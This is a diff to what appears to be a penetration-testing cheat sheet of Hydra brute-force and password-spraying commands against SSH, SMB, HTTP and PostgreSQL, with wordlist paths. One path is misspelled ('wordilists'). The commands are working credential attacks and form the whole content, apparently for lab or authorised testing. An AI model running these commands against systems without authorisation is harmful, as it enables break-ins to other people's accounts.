@@ -7,12 +7,17 @@ hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/
 hydra -L /usr/share/seclists/Usernames/cirt-default-usernames.txt -P /usr/share/wordlists/rockyou.txt -s SSH_Port ssh://target_IP
 ```
 
-Brute forcing with Password list. Change Service accordingly.
+Brute forcing ssh with Password list
 ```
 hydra -l USER_NAME -P /usr/share/wordlists/rockyou.txt ssh://target_IP
 ```
 ```
 hydra -l USER_NAME -P /usr/share/wordlists/rockyou.txt -s SSH_Port ssh://target_IP
+```
+
+SMB brute force, Change service accordingly
+```
+hydra -L user.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target_ip smb
 ```
 
 Password Spraying, Change service accordingly.
@@ -42,4 +47,12 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://Target_ip
 psql
 ```
 hydra -L /usr/share/metasploit-framework/data/wordlists/postgres_default_user.txt -P /usr/share/metasploit-framework/data/wordlists/postgres_default_pass.txt 172.16.242.134 postgres
+```
+
+Wordlists
+```
+/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
+```
+/usr/share/wordilists/rockyou.txt
 ```
